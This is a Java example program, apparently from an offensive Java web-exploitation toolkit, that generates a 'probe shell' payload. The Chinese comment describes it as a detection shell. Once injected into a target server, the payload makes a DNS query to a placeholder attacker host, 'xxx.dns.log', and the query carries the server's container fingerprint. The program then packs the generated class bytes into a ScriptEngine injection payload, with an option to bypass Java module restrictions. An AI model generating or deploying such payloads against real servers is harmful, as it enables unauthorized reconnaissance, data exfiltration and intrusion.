package com.reajason.javaweb.examples.probe;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.ProbeMethod;
import com.reajason.javaweb.probe.ProbeShellGenerator;
import com.reajason.javaweb.probe.ProbeShellResult;
import com.reajason.javaweb.probe.config.DnsLogConfig;
import com.reajason.javaweb.probe.config.ProbeConfig;

/**
 * 回显马（探测马）—— DNSLog 探测：目标发出 DNS 查询即证明目标可出网，
 * 且查询内容携带目标环境指纹（这里 {@code ProbeContent.Server} 回传容器信息）。
 *
 * @author ReaJason
 * @since 2025/8/13
 */
public class DnsLogProbe {
    public static void main(String[] args) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.DNSLog)
                .probeContent(ProbeContent.Server) // 暂只支持 Server 和 JDK
                .shrink(true)
                .debug(false)
                .build();

        DnsLogConfig dnsLogConfig = DnsLogConfig.builder()
                .host("xxx.dns.log")
                .build();

        ProbeShellResult result = ProbeShellGenerator.generate(probeConfig, dnsLogConfig);

        System.out.println("脚本引擎打包：" + Packers.ScriptEngine.getInstance().pack(ClassPackerConfig.of(
                result.getShellClassName(), result.getShellBytes(), result.getShellBytesBase64Str(),
                result.getProbeConfig() != null && result.getProbeConfig().needByPassJavaModule())));
    }
}
